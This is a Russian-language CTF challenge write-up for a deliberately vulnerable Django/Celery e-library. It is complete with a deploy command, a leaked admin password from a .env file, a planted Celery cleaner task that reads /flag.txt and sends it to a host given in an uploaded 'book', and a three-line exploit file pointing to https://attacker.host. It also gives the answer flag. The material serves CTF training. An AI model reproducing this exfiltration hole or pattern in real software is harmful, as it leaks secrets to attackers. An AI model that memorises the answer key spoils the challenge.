# web | library | medium

## Информация

> Я создал электронную бибилиотеку, пока она на стадии разработки, но я надеюсь что у меня максимально безопасный сервис и с кодом все хорошо, проверь его на всякий случай, пожалуйста =)


## Подсказка

Если я правильно помню, то admin хотел удалять(очищать) старые книги как-то автоматизированно, через таски, celery таски....

## Деплой

```bash
cd deploy
docker-compose up --build -d
```

## Выдать участникам

public/public.zip

## Описание

в коде сливается пароль админской учетки, при этом новые книги можно загрузить только из панели админа, все книги, которым больше 30 секунд удаляются и вызывается очень странный код - явно создавался для админа, чтобы исполнять код.

## Решение

в .env файле сливается пароль админа

```
SERVER_PORT=8900
EMAIL_HOST_USER=admin@mylibrary.ru
EMAIL_HOST_PASSWORD=to!R>@gq~Q8y2?XVVGe:
                                  
```

посмотрим кусок кода в celery таске cleaner.py - если загрузить bash скрипт, то он исполнится, чтобы было безопаснее, то в код явно уже встроены методы взятия флага и резолва на удаленный хост

```php
def cleaner():
    books_to_delete = Book.objects.filter(created_at__lte=timezone.now() - timezone.timedelta(seconds=30))
  
    deleted_count = 0
  
    for book in books_to_delete:
        file_path = os.path.join(BOOK_STORE, f"{book.uid}.txt")
        try:
            with open(file_path, 'r') as f:
                lines = f.readlines()
                if len(lines) == 3 and '#!/usr/bin/bash' in lines[0] and "cat " in lines[1]:
                    flag = ""

                    with open("/flag.txt", 'r') as f1:
                        for i in f1:
                            flag+=i.replace('\n','')
                    dom = lines[2].replace('\n','')
                    url = f"{dom}/{flag}"
                    requests.get(url, verify=False, timeout=1)
      
          
      
            book.delete()
            deleted_count += 1
  
        except FileNotFoundError:
            print(f"File for {book.title} not found.")
            book.delete()
            deleted_count += 1
```

пример sploit.txt: (именно txt потому что книга!) - его надо загрузить как книгу

```
#!/usr/bin/bash
cat flag
https://attacker.host
```

## Флаг

ctf{1_th1nk_1t_will_b3_e4sy!}
